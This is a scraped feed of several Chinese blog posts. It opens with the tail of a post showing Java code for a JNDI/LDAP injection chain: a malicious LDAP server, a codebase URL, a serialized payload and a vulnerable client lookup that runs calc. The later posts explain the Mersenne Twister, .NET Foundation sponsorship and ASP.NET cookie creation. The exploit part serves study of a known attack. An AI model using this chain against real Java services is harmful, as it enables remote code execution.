&lt;h2&gt;&lt;span&gt;JNDI Reference+LDAP&lt;/span&gt;&lt;/h2&gt;
&lt;p&gt;LDAPSeriServer.java&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;50&quot;&gt;
&lt;pre&gt;
package&lt;span&gt; com.longofo;

import&lt;span&gt; com.unboundid.ldap.listener.InMemoryDirectoryServer;
import&lt;span&gt; com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
import&lt;span&gt; com.unboundid.ldap.listener.InMemoryListenerConfig;

import&lt;span&gt; javax.net.ServerSocketFactory;
import&lt;span&gt; javax.net.SocketFactory;
import&lt;span&gt; javax.net.ssl.SSLSocketFactory;
import&lt;span&gt; java.io.IOException;
import&lt;span&gt; java.net.InetAddress;


/**
 * LDAP server implementation returning JNDI references
 *
 * @author mbechler
 */
public class&lt;span&gt; LDAPSeriServer {


    private static final String LDAP_BASE = &quot;dc=example,dc=com&quot;&lt;span&gt;;


    public static void main(String[] args) throws&lt;span&gt; IOException {
        int port = 1389&lt;span&gt;;

        try&lt;span&gt; {
            InMemoryDirectoryServerConfig config = new&lt;span&gt; InMemoryDirectoryServerConfig(LDAP_BASE);
            config.setListenerConfigs(new&lt;span&gt; InMemoryListenerConfig(
                    &quot;listen&quot;, //$NON-NLS-1$
                    InetAddress.getByName(&quot;0.0.0.0&quot;), //$NON-NLS-1$
&lt;span&gt;                    port,
                    ServerSocketFactory.getDefault(),
                    SocketFactory.getDefault(),
                    (SSLSocketFactory) SSLSocketFactory.getDefault()));

            config.setSchema(null&lt;span&gt;);
            config.setEnforceAttributeSyntaxCompliance(false&lt;span&gt;);
            config.setEnforceSingleStructuralObjectClass(false&lt;span&gt;);
　　　　　　
            InMemoryDirectoryServer ds = new&lt;span&gt; InMemoryDirectoryServer(config);
            ds.add(&quot;dn: &quot; + &quot;dc=example,dc=com&quot;, &quot;objectClass: test_node1&quot;&lt;span&gt;);  //因为LDAP是树形结构的，因此这里要构造树形节点，那么肯定有父节点与子节点
            ds.add(&quot;dn: &quot; + &quot;ou=employees,dc=example,dc=com&quot;, &quot;objectClass: test_node3&quot;&lt;span&gt;);
            ds.add(&quot;dn: &quot; + &quot;uid=longofo,ou=employees,dc=example,dc=com&quot;, &quot;objectClass: ExportObject&quot;&lt;span&gt;); //此子节点中存储Reference类名
            System.out.println(&quot;Listening on 0.0.0.0:&quot; + port); //$NON-NLS-1$
&lt;span&gt;            ds.startListening();  //LDAP服务开始监听

        } catch&lt;span&gt; (Exception e) {
            e.printStackTrace();
        }
    }
}&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;LDAPServer.java&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;48&quot;&gt;
&lt;pre&gt;
package&lt;span&gt; com.longofo;

import&lt;span&gt; javax.naming.Context;
import&lt;span&gt; javax.naming.NamingException;
import&lt;span&gt; javax.naming.directory.BasicAttribute;
import&lt;span&gt; javax.naming.directory.DirContext;
import&lt;span&gt; javax.naming.directory.InitialDirContext;
import&lt;span&gt; javax.naming.directory.ModificationItem;
import&lt;span&gt; java.io.File;
import&lt;span&gt; java.io.IOException;
import&lt;span&gt; java.nio.file.Files;
import&lt;span&gt; java.util.Hashtable;

public class&lt;span&gt; LDAPServer1 {
    public static void main(String[] args) throws&lt;span&gt; NamingException, IOException {
        Hashtable env = new&lt;span&gt; Hashtable();
        env.put(Context.INITIAL_CONTEXT_FACTORY,
                &quot;com.sun.jndi.ldap.LdapCtxFactory&quot;&lt;span&gt;);
        env.put(Context.PROVIDER_URL, &quot;ldap://localhost:1389&quot;&lt;span&gt;);

        DirContext ctx = new&lt;span&gt; InitialDirContext(env);


        String javaCodebase = &quot;http://127.0.0.1:8000/&quot;&lt;span&gt;;  //配置加载远程工厂类的地址


        byte[] javaSerializedData = Files.readAllBytes(new File(&quot;C:\\Users\\91999\\Desktop\\rmi-jndi-ldap-jrmp-jmx-jms-master\\ldap\\src\\main\\java\\com\\longofo\\1.ser&quot;&lt;span&gt;).toPath());

        BasicAttribute mod1 = new&lt;span&gt;
                BasicAttribute(&quot;javaCodebase&quot;&lt;span&gt;, javaCodebase);
        BasicAttribute mod2 = new&lt;span&gt;
                BasicAttribute(&quot;javaClassName&quot;, &quot;DeserPayload&quot;&lt;span&gt;);
        BasicAttribute mod3 = new BasicAttribute(&quot;javaSerializedData&quot;&lt;span&gt;,
                javaSerializedData);&lt;br/&gt;ModificationItem[] mods = new ModificationItem[3&lt;span&gt;];
        mods[0] = new&lt;span&gt; ModificationItem(DirContext.ADD_ATTRIBUTE, mod1);
        mods[1] = new&lt;span&gt; ModificationItem(DirContext.ADD_ATTRIBUTE, mod2);
        mods[2] = new&lt;span&gt; ModificationItem(DirContext.ADD_ATTRIBUTE, mod3);
        ctx.modifyAttributes(&quot;uid=longofo,ou=employees,dc=example,dc=com&quot;&lt;span&gt;, mods);
    }
}&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt; LDAPClient.java&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;39&quot;&gt;
&lt;pre&gt;
package&lt;span&gt; com.longofo.jndi;

import&lt;span&gt; javax.naming.Context;
import&lt;span&gt; javax.naming.InitialContext;
import&lt;span&gt; javax.naming.NamingException;

public class&lt;span&gt; LDAPClient1 {
    public static void main(String[] args) throws&lt;span&gt; NamingException {
        System.setProperty(&quot;com.sun.jndi.ldap.object.trustURLCodebase&quot;,&quot;true&quot;&lt;span&gt;);
        Context ctx = new&lt;span&gt; InitialContext();
        Object object =  ctx.lookup(&quot;ldap://127.0.0.1:1389/uid=longofo,ou=employees,dc=example,dc=com&quot;&lt;span&gt;);
    }
}&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;此时客户端初始化上下文后就可以去访问ldap服务器上对应的记录，记录名为uid=longofo,ou=employees,dc=example,dc=com ，那么对应在服务端的命名空间中必定存在这条记录，以及绑定的Reference对象。此时就能calc。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/i-beta/1063309/202001/1063309-20200124220308514-1868824432.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt; &lt;img src=&quot;https://img2018.cnblogs.com/i-beta/1063309/202001/1063309-20200124220318602-333200131.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;

</description>
<pubDate>Fri, 24 Jan 2020 14:07:00 +0000</pubDate>
<dc:creator>tr1ple</dc:creator>
<og:description>关于JNDI： 命名系统是一组关联的上下文，而上下文是包含零个或多个绑定的对象，每个绑定都有一个原子名(实际上就是给绑定的对象起个名字，方便查找该绑定的对象)，&amp;#160;使用JNDI的好处就是配置统</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/tr1ple/p/12232601.html</dc:identifier>
</item>
<item>
<title>你没听过的梅森旋转算法 - CHNmuxii</title>
<link>http://www.cnblogs.com/CHNmuxii/p/12232475.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/CHNmuxii/p/12232475.html</guid>
<description>&lt;p&gt;（标准开头）&lt;/p&gt;
&lt;p&gt;如果单独提梅森旋转算法可能大家都很陌生，但如果说到C++11的random可能大家就都熟悉多了。事实上，C++，python等多种计算机语言的随机数都是通过梅森旋转算法产生的。（也有一个称呼是梅森缠绕算法）&lt;/p&gt;
&lt;p&gt;那，本文就着重介绍这个梅森&lt;del&gt;螺旋&lt;/del&gt;旋转算法&lt;/p&gt;
&lt;p&gt;（算法本身挺学术的，我努力写得轻松点）&lt;/p&gt;
&lt;p&gt;先在这里感谢一下@&lt;a href=&quot;https://www.luogu.org/space/show?uid=33556&quot;&gt;dgklr&lt;/a&gt;大佬的引导。如果没有他提及，笔者可能还不知道这个算法。&lt;/p&gt;

&lt;p&gt;梅森旋转算法，也可以写作MT19937。是有由松本真和西村拓士在1997年开发的一种能快速产生优质随机数的算法。&lt;/p&gt;
&lt;p&gt;其实这个算法跟梅森没有什么关系，它之所以叫做是梅森旋转算法是因为它的循环节是2^19937-1，这个叫做梅森素数。&lt;/p&gt;
&lt;p&gt;如果看过我的那篇随机数的文章应该知道关于伪随机的一些知识。这个随机算法之所以说是产生“优质“”随机数，特点就是它的循环节特别长。而且产生的数分布是比较平均的。&lt;/p&gt;
&lt;h6 id=&quot;可能有的同学对这个循环节有点质疑可能觉得219937-1有点短&quot;&gt;可能有的同学对这个循环节有点质疑。可能觉得2^19937-1有点短？&lt;/h6&gt;
&lt;p&gt;我在这里大概给一个概念：&lt;/p&gt;
&lt;p&gt;银河系中的恒星数量级10^11&lt;/p&gt;
&lt;p&gt;撒哈拉沙漠中的沙子数数量级是10^26&lt;/p&gt;
&lt;p&gt;宇宙中目前可观察的粒子数量级是10^87&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;2^19937数量级是10^6001&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;这个比较大概心里有数了吧&lt;/p&gt;
&lt;p&gt;相差的已经不止是一个数量级了&lt;/p&gt;
&lt;p&gt;同时他在623维中的分布都十分的均匀（这个不用理解）&lt;/p&gt;
&lt;p&gt;知道分布平均就好了&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://cdn.luogu.com.cn/upload/pic/74125.png&quot; alt=&quot;梅森&quot;/&gt;&lt;/p&gt;
&lt;p&gt;（梅森镇楼）&lt;/p&gt;
&lt;p&gt;-&amp;gt;continue&lt;/p&gt;

&lt;p&gt;分析这个算法的原理需要的前置知识在网上讲的都比较绕，我在这里就通俗的科普一下，主要是认识这几个名词。&lt;/p&gt;
&lt;p&gt;（用词不准确轻喷）&lt;/p&gt;
&lt;h4 id=&quot;线性反馈移位寄存器lfsr&quot;&gt;线性反馈移位寄存器（LFSR）&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;https://cdn.luogu.com.cn/upload/pic/74127.png&quot; alt=&quot;线性反馈位移寄存器&quot;/&gt;&lt;/p&gt;
&lt;p&gt;这个，就当它是随机数发生器就完事了，不要太去纠结定义。后面会讲。&lt;/p&gt;
&lt;h4 id=&quot;本原多项式&quot;&gt;本原多项式&lt;/h4&gt;
&lt;p&gt;简单的说来就是没法化简的多项式&lt;/p&gt;
&lt;p&gt;比如 y=x^4+x^2 就可以化简&lt;/p&gt;
&lt;p&gt;也是知道就好&lt;/p&gt;
&lt;h4 id=&quot;级&quot;&gt;级&lt;/h4&gt;
&lt;p&gt;计算机的一个二进制单位（0或1）就是一级&lt;/p&gt;
&lt;p&gt;这个应该比较好理解&lt;/p&gt;
&lt;h4 id=&quot;反馈函数&quot;&gt;反馈函数&lt;/h4&gt;
&lt;p&gt;这个应该是网上看别的博客最绕的知识点&lt;/p&gt;
&lt;p&gt;简单地理解成告诉你你要对这个寄存器干什么的一个函数就好了&lt;/p&gt;
&lt;p&gt;（看到这里应该还没懵吧）&lt;/p&gt;
&lt;h4 id=&quot;异或&quot;&gt;异或&lt;/h4&gt;
&lt;p&gt;这个...&lt;/p&gt;
&lt;p&gt;还要我科普吗？&lt;/p&gt;
&lt;p&gt;就是两个数，如果都是0或都是1就输出0，一个1一个0输出1.&lt;/p&gt;
&lt;p&gt;-&amp;gt;continue&lt;/p&gt;

&lt;p&gt;这个旋转算法实际上是对一个19937级的二进制序列作变换。&lt;/p&gt;
&lt;p&gt;首先我们达成一个共识：&lt;/p&gt;
&lt;p&gt;一个长度为n的二进制序列，它的排列长度最长为2^n。&lt;/p&gt;
&lt;p&gt;当然这个也是理论上的，实际上可能因为某些操作不当，没挺到2^n个就开始循环了。&lt;/p&gt;
&lt;p&gt;那么如何将这个序列的排列撑满2^n个，就是这个旋转算法的精髓。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;如果反馈函数的本身+1是一个本原多项式，那么它的循环节达到最长，即2^n-1&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;这个数学证明本文不作过多论述，有兴趣者可以自己查阅资料&lt;/p&gt;
&lt;p&gt;个人感觉单讲知识点挺难懂的（笔者就是这么被坑的）&lt;/p&gt;
&lt;p&gt;我们就拿一个4级的寄存器模拟一下：&lt;/p&gt;
&lt;p&gt;我们这里使用的反馈函数是 y=x^4+x^2+x+1（这个不是本原多项式，只是拿来好理解） 这个式子中x^4,x^2,x的意思就是我们每次对这个二进制序列的从后往前数第4位和第2位做异或运算 ，然后再拿结果和最后一位做异或运算。把最后的结果放到序列的开头，整个序列后移一位，最后一位舍弃（或者输出）&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://cdn.luogu.com.cn/upload/pic/74139.png&quot; alt=&quot;第一步&quot;/&gt;&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;初始数组 { 1 ， 0 ， 0 ， 0 } （为什么不是 0，0，0，0 你们可以自己想想，文章末尾揭晓）&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;&lt;img src=&quot;https://cdn.luogu.com.cn/upload/pic/74141.png&quot; alt=&quot;第二步&quot;/&gt;&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;将它的第四位和第二位抓出来做异或运算&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;&lt;img src=&quot;https://cdn.luogu.com.cn/upload/pic/74143.png&quot; alt=&quot;第三步&quot;/&gt;&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;把刚刚的运算结果和最后一位再做一次运算&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;&lt;img src=&quot;https://cdn.luogu.com.cn/upload/pic/74144.png&quot; alt=&quot;第四步&quot;/&gt;&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;把最后的运算结果放到第一位，序列后移。最后一位被无情的抛弃&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;这就是一次运算，然后这个算法就是不断循环这几步，从而不断伪随机改变这个序列。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://cdn.luogu.com.cn/upload/pic/74151.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;上图是一个网上找的一个4级寄存器的模拟过程&lt;/p&gt;
&lt;p&gt;大家可以推一下，它所使用的反馈函数（y=x^4+x+1）&lt;/p&gt;
&lt;p&gt;因为这个是本原多项式&lt;/p&gt;
&lt;p&gt;所以他最后的循环节是2^4-1=15&lt;/p&gt;
&lt;p&gt;运算结果如下：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://cdn.luogu.com.cn/upload/pic/74152.png&quot; alt=&quot;结果&quot;/&gt;&lt;/p&gt;
&lt;p&gt;（图片摘自&lt;a href=&quot;https://www.cnblogs.com/mengfanrong/p/3840765.html&quot;&gt;原文链接&lt;/a&gt;）&lt;/p&gt;
&lt;h4 id=&quot;关于旋转&quot;&gt;关于旋转&lt;/h4&gt;
&lt;p&gt;可能有人到这里还没看出“旋转”在哪里。因为我们每次计算出来的结果会放在开头，序列后移一位。看起来就像数组在向后旋转...&lt;/p&gt;
&lt;p&gt;（本来想做gif的，后来不知道怎么做出旋转）&lt;/p&gt;
&lt;p&gt;大家自行脑补&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://cdn.luogu.com.cn/upload/pic/74153.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;-&amp;gt;continue&lt;/p&gt;

&lt;p&gt;（笔者很懒，直接搬&lt;a href=&quot;http://www.it610.com/article/1902097.htm&quot;&gt;原代码出处&lt;/a&gt;的代码）&lt;/p&gt;
&lt;pre class=&quot;cpp&quot;&gt;
&lt;code&gt;#include &amp;lt;iostream&amp;gt;
#include &amp;lt;string.h&amp;gt;
#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;time.h&amp;gt;

using namespace std;

bool isInit;
int index;
int MT[624];  //624 * 32 - 31 = 19937

void srand(int seed)
{
    index = 0;
    isInit = 1;
    MT[0] = seed;
    for(int i=1; i&amp;lt;624; i++)
    {
        int t = 1812433253 * (MT[i-1] ^ (MT[i-1] &amp;gt;&amp;gt; 30)) + i;
        MT[i] = t &amp;amp; 0xffffffff;   //取最后的32位
    }
}

void generate()
{
    for(int i=0; i&amp;lt;624; i++)
    {
        // 2^31 = 0x80000000
        // 2^31-1 = 0x7fffffff
        int y = (MT[i] &amp;amp; 0x80000000) + (MT[(i+1) % 624] &amp;amp; 0x7fffffff);
        MT[i] = MT[(i + 397) % 624] ^ (y &amp;gt;&amp;gt; 1);
        if (y &amp;amp; 1)
            MT[i] ^= 2567483615;
    }
}
int rand()
{
    if(!isInit)
        srand((int)time(NULL));
    if(index == 0)
        generate();
    int y = MT[index];
    y = y ^ (y &amp;gt;&amp;gt; 11);
    y = y ^ ((y &amp;lt;&amp;lt; 7) &amp;amp; 2636928640);
    y = y ^ ((y &amp;lt;&amp;lt; 15) &amp;amp; 4022730752);
    y = y ^ (y &amp;gt;&amp;gt; 18);
    index = (index + 1) % 624;
    return y;  //笔者注：y即为产生的随机数 
}

int main()
{
    srand(0);  //设置随机种子
    int cnt = 0;
    for(int i=0; i&amp;lt;1000000; i++)  //下面的循环是用来判断随机数的奇偶概率的 
    {
        if(rand() &amp;amp; 1)
            cnt++;
    }
    cout&amp;lt;&amp;lt;cnt / 10000.0&amp;lt;&amp;lt;&quot;%&quot;&amp;lt;&amp;lt;endl;
    return 0;
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;-&amp;gt;continue&lt;/p&gt;

&lt;p&gt;这里回答一下前面的那个问题：&lt;/p&gt;
&lt;p&gt;为什么循环节是2^n-1而不是2^n&lt;/p&gt;
&lt;p&gt;这个问题的答案和为什么初始序列不能是 { 0 , 0 , 0 , 0 }是一样的，因为如果全是0的话，无论怎么异或运算都不能产生循环。那么还怎么伪随机啊。&lt;/p&gt;
&lt;p&gt;因为不能是全0，所以循环节要-1&lt;/p&gt;
&lt;p&gt;（* o *）&lt;/p&gt;
&lt;p&gt;（ ⊕ o ⊕ )&lt;/p&gt;
&lt;p&gt;最后非常感谢你能有耐心读到这里。&lt;/p&gt;
&lt;p&gt;大家都很强，可与之共勉。&lt;/p&gt;
</description>
<pubDate>Fri, 24 Jan 2020 10:45:00 +0000</pubDate>
<dc:creator>CHNmuxii</dc:creator>
<og:description>（标准开头） 如果单独提梅森旋转算法可能大家都很陌生，但如果说到C++11的random可能大家就都熟悉多了。事实上，C++，python等多种计算机语言的随机数都是通过梅森旋转算法产生的。（也有一个</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/CHNmuxii/p/12232475.html</dc:identifier>
</item>
<item>
<title>DevExpress作为企业赞助商加入.NET基金会 - 张善友</title>
<link>http://www.cnblogs.com/shanyou/p/12232381.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/shanyou/p/12232381.html</guid>
<description>&lt;p&gt;.NET基金会是一个独立的非营利组织，于2014年成立，旨在围绕 .NET 不断增长的开源技术集合，促进开放开发和协作。它是商业和社区开发人员的论坛，通过促进开放性，社区参与和快速创新来增强.NET生态系统的未来。&lt;/p&gt;
&lt;p&gt;要使.NET 基金会真正独立并由社区运营，则需要独立资助。过去，.NET 基金会依靠来自Microsoft的捐款。展望未来，我们将获得企业赞助和会员费的资助。微软作为企业赞助商的捐赠现在只占.NET 基金会资金的一小部分。&lt;/p&gt;
&lt;p&gt;企业赞助确实扩大了.NET 基金会的功能-不仅有更大的预算，而且还能够根据年度会费制定长期计划。企业赞助将直接将.NET企业界纳入.NET开源生态系统中，这一点很重要！我们将获得依赖于.NET开源的公司的意见，我们将能够解决一些难题，例如公司如何参与可持续社区运营的开源项目。&lt;/p&gt;
&lt;p&gt;.NET基金会的博客文章（&lt;a href=&quot;https://www.dotnetfoundation.org/blog/2019/01/16/why-you-should-join-part-2---corporate-sponsor&quot;&gt;https://www.dotnetfoundation.org/blog/2019/01/16/why-you-should-join-part-2---corporate-sponsor&lt;/a&gt;）详细介绍了企业赞助：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;大公司（每年收入超过1000万美元）：每年50,000美元&lt;/li&gt;
&lt;li&gt;中型公司（每年收入$ 3百万-$ 10百万）：每年$ 25,000&lt;/li&gt;
&lt;li&gt;小公司（每年&amp;lt;$ 3M）：每年$ 10,000&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;.NET基金会博客（&lt;a href=&quot;https://dotnetfoundation.org/blog/2020/01/14/welcoming-devexpress-to-the-net-foundation-as-a-corporate-sponsor&quot;&gt;https://dotnetfoundation.org/blog/2020/01/14/welcoming-devexpress-to-the-net-foundation-as-a-corporate-sponsor&lt;/a&gt;）DevExpress加入了支持.NET Foundation的.NET开源生态系统中越来越多的行业领导者，这些成员包括Microsoft，Google，AWS，Red Hat，JetBrains，Unity，Samsung，Pivotal，Insight和Telerik。&lt;/p&gt;
&lt;p&gt;美国的三大云厂商Microsoft，Google，AWS都已经加入了.NET基金会的企业赞助商，2019年NEO加入了.NET基金会，不过还没有国内的云厂商加入到.NET基金会，希望2020年能有国内的云厂商加入.NET基金会。&lt;/p&gt;
</description>
<pubDate>Fri, 24 Jan 2020 09:16:00 +0000</pubDate>
<dc:creator>张善友</dc:creator>
<og:description>.NET基金会是一个独立的非营利组织，于2014年成立，旨在围绕 .NET 不断增长的开源技术集合，促进开放开发和协作。它是商业和社区开发人员的论坛，通过促进开放性，社区参与和快速创新来增强.NET生</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/shanyou/p/12232381.html</dc:identifier>
</item>
<item>
<title>ASP.NET Cookie是怎么生成的 - .NET骚操作</title>
<link>http://www.cnblogs.com/sdflysha/p/20200123-how-does-aspnet-identity-cookie-generated.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/sdflysha/p/20200123-how-does-aspnet-identity-cookie-generated.html</guid>
<description>&lt;p&gt;可能有人知道&lt;code&gt;Cookie&lt;/code&gt;的生成由&lt;code&gt;machineKey&lt;/code&gt;有关，&lt;code&gt;machineKey&lt;/code&gt;用于决定&lt;code&gt;Cookie&lt;/code&gt;生成的算法和密钥，并如果使用多台服务器做负载均衡时，必须指定一致的&lt;code&gt;machineKey&lt;/code&gt;用于解密，那么这个过程到底是怎样的呢？&lt;/p&gt;
&lt;p&gt;如果需要在&lt;code&gt;.NET Core&lt;/code&gt;中使用&lt;code&gt;ASP.NET Cookie&lt;/code&gt;，本文将提到的内容也将是一些必经之路。&lt;/p&gt;

&lt;p&gt;首先用户通过&lt;code&gt;AccountController-&amp;gt;Login&lt;/code&gt;进行登录：&lt;/p&gt;
&lt;pre class=&quot;csharp&quot;&gt;
&lt;code&gt;//
// POST: /Account/Login
public async Task&amp;lt;ActionResult&amp;gt; Login(LoginViewModel model, string returnUrl)
{
    if (!ModelState.IsValid)
    {
        return View(model);
    }

    var result = await SignInManager.PasswordSignInAsync(model.Email, model.Password, model.RememberMe, shouldLockout: false);
    switch (result)
    {
        case SignInStatus.Success:
            return RedirectToLocal(returnUrl);
        // ......省略其它代码
    }
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;它调用了&lt;code&gt;SignInManager&lt;/code&gt;的&lt;code&gt;PasswordSignInAsync&lt;/code&gt;方法，该方法代码如下（有删减）：&lt;/p&gt;
&lt;pre class=&quot;csharp&quot;&gt;
&lt;code&gt;public virtual async Task&amp;lt;SignInStatus&amp;gt; PasswordSignInAsync(string userName, string password, bool isPersistent, bool shouldLockout)
{
    // ...省略其它代码
    if (await UserManager.CheckPasswordAsync(user, password).WithCurrentCulture())
    {
        if (!await IsTwoFactorEnabled(user))
        {
            await UserManager.ResetAccessFailedCountAsync(user.Id).WithCurrentCulture();
        }
        return await SignInOrTwoFactor(user, isPersistent).WithCurrentCulture();
    }
    // ...省略其它代码
    return SignInStatus.Failure;
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;想浏览原始代码，可参见官方的&lt;code&gt;Github&lt;/code&gt;链接：&lt;a href=&quot;https://github.com/aspnet/AspNetIdentity/blob/master/src/Microsoft.AspNet.Identity.Owin/SignInManager.cs#L235-L276&quot; class=&quot;uri&quot;&gt;https://github.com/aspnet/AspNetIdentity/blob/master/src/Microsoft.AspNet.Identity.Owin/SignInManager.cs#L235-L276&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;可见它先需要验证密码，密码验证正确后，它调用了&lt;code&gt;SignInOrTwoFactor&lt;/code&gt;方法，该方法代码如下：&lt;/p&gt;
&lt;pre class=&quot;csharp&quot;&gt;
&lt;code&gt;private async Task&amp;lt;SignInStatus&amp;gt; SignInOrTwoFactor(TUser user, bool isPersistent)
{
    var id = Convert.ToString(user.Id);
    if (await IsTwoFactorEnabled(user) &amp;amp;&amp;amp; !await AuthenticationManager.TwoFactorBrowserRememberedAsync(id).WithCurrentCulture())
    {
        var identity = new ClaimsIdentity(DefaultAuthenticationTypes.TwoFactorCookie);
        identity.AddClaim(new Claim(ClaimTypes.NameIdentifier, id));
        AuthenticationManager.SignIn(identity);
        return SignInStatus.RequiresVerification;
    }
    await SignInAsync(user, isPersistent, false).WithCurrentCulture();
    return SignInStatus.Success;
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;该代码只是判断了是否需要做双重验证，在需要双重验证的情况下，它调用了&lt;code&gt;AuthenticationManager&lt;/code&gt;的&lt;code&gt;SignIn&lt;/code&gt;方法；否则调用&lt;code&gt;SignInAsync&lt;/code&gt;方法。&lt;code&gt;SignInAsync&lt;/code&gt;的源代码如下：&lt;/p&gt;
&lt;pre class=&quot;csharp&quot;&gt;
&lt;code&gt;public virtual async Task SignInAsync(TUser user, bool isPersistent, bool rememberBrowser)
{
    var userIdentity = await CreateUserIdentityAsync(user).WithCurrentCulture();
    // Clear any partial cookies from external or two factor partial sign ins
    AuthenticationManager.SignOut(DefaultAuthenticationTypes.ExternalCookie, DefaultAuthenticationTypes.TwoFactorCookie);
    if (rememberBrowser)
    {
        var rememberBrowserIdentity = AuthenticationManager.CreateTwoFactorRememberBrowserIdentity(ConvertIdToString(user.Id));
        AuthenticationManager.SignIn(new AuthenticationProperties { IsPersistent = isPersistent }, userIdentity, rememberBrowserIdentity);
    }
    else
    {
        AuthenticationManager.SignIn(new AuthenticationProperties { IsPersistent = isPersistent }, userIdentity);
    }
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;可见，最终所有的代码都是调用了&lt;code&gt;AuthenticationManager.SignIn&lt;/code&gt;方法，所以该方法是创建&lt;code&gt;Cookie&lt;/code&gt;的关键。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;AuthenticationManager&lt;/code&gt;的实现定义在&lt;code&gt;Microsoft.Owin&lt;/code&gt;中，因此无法在&lt;code&gt;ASP.NET Identity&lt;/code&gt;中找到其源代码，因此我们打开&lt;code&gt;Microsoft.Owin&lt;/code&gt;的源代码继续跟踪（有删减）：&lt;/p&gt;
&lt;pre class=&quot;csharp&quot;&gt;
&lt;code&gt;public void SignIn(AuthenticationProperties properties, params ClaimsIdentity[] identities)
{
    AuthenticationResponseRevoke priorRevoke = AuthenticationResponseRevoke;
    if (priorRevoke != null)
    {
        // ...省略不相关代码
        AuthenticationResponseRevoke = new AuthenticationResponseRevoke(filteredSignOuts);
    }

    AuthenticationResponseGrant priorGrant = AuthenticationResponseGrant;
    if (priorGrant == null)
    {
        AuthenticationResponseGrant = new AuthenticationResponseGrant(new ClaimsPrincipal(identities), properties);
    }
    else
    {
        // ...省略不相关代码

        AuthenticationResponseGrant = new AuthenticationResponseGrant(new ClaimsPrincipal(mergedIdentities), priorGrant.Properties);
    }
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;AuthenticationManager&lt;/code&gt;的&lt;code&gt;Github&lt;/code&gt;链接如下：&lt;a href=&quot;https://github.com/aspnet/AspNetKatana/blob/c33569969e79afd9fb4ec2d6bdff877e376821b2/src/Microsoft.Owin/Security/AuthenticationManager.cs&quot; class=&quot;uri&quot;&gt;https://github.com/aspnet/AspNetKatana/blob/c33569969e79afd9fb4ec2d6bdff877e376821b2/src/Microsoft.Owin/Security/AuthenticationManager.cs&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;可见它用到了&lt;code&gt;AuthenticationResponseGrant&lt;/code&gt;，继续跟踪可以看到它实际是一个属性：&lt;/p&gt;
&lt;pre class=&quot;csharp&quot;&gt;
&lt;code&gt;public AuthenticationResponseGrant AuthenticationResponseGrant
{
    // 省略get
    set
    {
        if (value == null)
        {
            SignInEntry = null;
        }
        else
        {
            SignInEntry = Tuple.Create((IPrincipal)value.Principal, value.Properties.Dictionary);
